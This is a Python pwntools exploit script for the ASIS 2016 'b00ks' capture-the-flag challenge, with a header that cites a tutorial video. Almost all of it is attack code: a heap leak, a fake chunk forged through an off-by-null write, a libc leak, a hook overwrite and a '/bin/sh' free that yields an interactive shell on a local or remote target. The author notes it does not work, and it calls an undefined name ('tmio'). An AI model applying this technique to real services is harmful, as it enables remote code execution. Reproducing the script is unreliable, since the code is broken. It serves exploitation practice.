'''
@Author       : 白银
@Date         : 2023-03-11 09:50:14
@LastEditors  : 白银
@LastEditTime : 2023-03-11 10:57:19
@FilePath     : /pwn/Asis_2016_b00ks.py
@Description  : offbynull  https://www.bilibili.com/video/BV1Uv411j7fr?t=1223.8&p=21
@Attention    : 打不通
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *


def set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port):
    # set_arch = 0

    if set_arch == 0:
        context(log_level='debug', arch='amd64', os='linux')
    elif set_arch == 1:
        context(log_level='debug', arch='arm64', os='linux')
    elif set_arch == 2:
        context(log_level='debug', arch='i386', os='linux')

    # pwnfile = './pwn1'
    elf = ELF(pwnfile)

    # if_remote = 0  # 0为远程

    if if_remote == 1:
        # io = remote("192.168.61.139", 8888)
        io = remote(remote_addr, remote_port)
        # io = remote("node4.buuoj.cn", 26852)
        # libc = ELF('/home/jack/Desktop/libc.so.6')

        if set_arch == 0 or set_arch == 1: 
            libc = ELF('/home/jack/Desktop/x64_libc.so.6')
        else:
            libc = ELF('/home/jack/Desktop/x86_libc.so.6')
    else:
        io = process(pwnfile)

        # 本地用
        # elf = ELF(pwnfile)
        libc = elf.libc
        rop = ROP(pwnfile)

        # 本地调试用
        gdb.attach(io)
        pause()

    # leak heap addr
    pay_len = 0x80  # heap magic
    create_a_book(io, pay_len, b'\x41' * pay_len, pay_len, b'\x42' * pay_len)
    heap_addr = print_book_detail(io)
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()

    # off-by-null heap magic
    delete_a_book(io, 1)
    pay_len = 0x50
    create_a_book(io, pay_len, b'\x43' * pay_len, pay_len, b'\x42' * pay_len)
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()
    pay_len = 0x80
    payload = p64(0x4545) + p64(heap_addr + 0x120 + 0x8) + \
        p64(heap_addr + 0x120 + 0x8) + p64(0x100)
    create_a_book(io, pay_len, payload, pay_len, b'\x42' * pay_len)
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()

    # leak libc, phase 1
    pay_len = 0x500
    create_a_book(io, pay_len, b'\x41' * pay_len,
                  pay_len, b'\x42' * pay_len)  # No.4
    delete_a_book(io, 4)
    create_a_book(io, pay_len, b'\x41' * 7, pay_len, b'\x42' * 7)  # No.4
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()

    # leak libc, phase 2
    change_author_name(io, b'\x41' * 0x20)
    io.sendline('4')
    tmp = io.recvuntil('> ')
    tmp = tmio.splitlines()
    tmp = tmp[1]
    tmp = tmp[6:12] + b'\x00\x00'
    tmp = u64(tmp)
    tmp = tmp - 0x3ec210
    libc_base = tmp
    print("libc_base:", hex(libc_base))

    # get shell
    delete_a_book(io, 3)
    pay_len = 0x80
    payload = p64(0x50) + p64(libc_base + 0x3ed8e8) + \
        p64(libc_base + 0x3ed8e8) + p64(0x100)
    create_a_book(io, pay_len, payload, pay_len, payload)
    edit_a_book(io, 0x50, p64(libc_base + 0x4f440))
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()
    create_a_book(io, 0x20, b'/bin/sh\x00', 0x20, b'/bin/sh\x00')
    # os.system("gnome-terminal -- gdb attach %s" % (str(proc.pidof(io)[0])))
    # input()
    io.sendline("2")
    io.recvuntil("Enter the book id you want to delete: ")
    io.sendline('7')
    io.interactive()


def initial_author_name(io, author_name):
    io.recvuntil("Enter author name: ")
    io.sendline(author_name)
    log.info(io.recvuntil("> "))


def create_a_book(io, bname_Size, book_name, bdes_Size, book_des):
    io.sendline("1")
    io.recvuntil("Enter book name size: ")
    io.sendline(str(bname_Size))
    io.recvuntil("Enter book name (Max 32 chars): ")
    io.sendline(book_name)
    io.recvuntil("Enter book description size: ")
    io.sendline(str(bdes_Size))
    io.recvuntil("Enter book description: ")
    io.sendline(book_des)
    log.info(io.recvuntil("> "))


def print_book_detail(io):
    io.sendline("4")
    arr_line = io.recvuntil("> ", drop=False)
    arr_line = arr_line.splitlines()
    tmp_addr = arr_line[3]
    # print(book1_addr)
    # print(len(book1_addr))
    # print(book1_addr[-1:-7:-1])
    result = tmp_addr[-6:]
    result += b"\x00" * 2
    result = u64(result)
    log.info("boo1_addr:%s" % (hex(result)))
    return result


def edit_a_book(io, book_id, book_des):
    io.sendline("3")
    io.recvuntil("Enter the book id you want to edit: ")
    io.sendline(str(book_id))
    io.recvuntil("Enter new book description: ")
    io.sendline(book_des)
    log.info(io.recvuntil("> "))


def change_author_name(io, author_name):
    io.sendline("5")
    io.recvuntil("Enter author name: ")
    io.sendline(author_name)
    log.info(io.recvuntil("> "))


def libc_leak(io):
    io.sendline("4")
    io.recvuntil("Name: ", drop=True)
    tmp_addr = io.recvuntil("Description: ", drop=True)
    log.info("length of addr:%d" % (len(tmp_addr)))
    tmp_addr = tmp_addr[0:6]
    tmp_addr += b'\x00' * 2
    tmp_addr = u64(tmp_addr)
    print("mmap_addr:", hex(tmp_addr))
    log.info(io.recvuntil("> "))
    return tmp_addr


def delete_a_book(io, book_id):
    io.sendline("2")
    io.recvuntil("Enter the book id you want to delete: ")
    io.sendline(str(book_id))
    log.info(io.recvuntil("> ", timeout=0.1))

if __name__ == '__main__':
    set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
    pwnfile = './Asis_2016_b00ks'  # pwnfile， str，二进制文件
    if_remote = 1  # if_remote，int，1→远程，别的数字→本地
    remote_addr = "192.168.61.139"  # remote_addr，str，远程地址
    remote_port = 8888  # remote_port，int， 远程端口
    # 打本地，if_remote改别的数字就可以，最后两个参数随便改
    # set_arch, pwnfile, if_remote, remote_addr, remote_port
    set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port)
